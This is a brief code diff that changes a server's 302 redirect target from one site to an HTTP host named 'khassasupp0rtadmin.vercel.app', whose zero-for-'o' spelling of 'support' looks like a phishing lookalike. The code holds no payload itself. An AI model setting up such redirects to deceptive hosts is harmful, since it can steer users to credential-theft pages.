@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://ctikes.com/", // Replace this with your actual link
+      Location: "http://khassasupp0rtadmin.vercel.app//", // Replace this with your actual link
     },
   });
 });
